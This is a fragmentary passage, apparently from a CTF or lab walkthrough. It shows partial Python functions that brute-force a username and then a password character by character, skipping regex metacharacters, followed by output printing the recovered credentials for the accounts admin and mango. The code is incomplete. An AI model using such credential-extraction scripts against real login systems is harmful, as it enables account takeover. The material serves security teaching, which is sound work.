...
Now that we have 'admin' as a valid username, we can use the same method to extract the password. Doing this manually is possible but would take a very long time so instead, we can build a python script 
...
def findUsername(username):  
    for i in string.ascii_letters + string.digits:
        print("\rFuzzing Username: %s%s" % (username, i), end='')
...
def findPassword(username, password=''):     
    while True:
        for i in string.ascii_letters + string.digits + string.punctuation:
            if i in {"?","*", "+", ".","\\", "|"}:
                continue
            print("\rFuzzing Password: %s%s" % (password, i), end='')
...
Fuzzing Username: admin

Fuzzing Password: t9KcS3>!0B#2

Fuzzing Username: mango

Fuzzing Password: h3mXK8RhU~f{]f5H
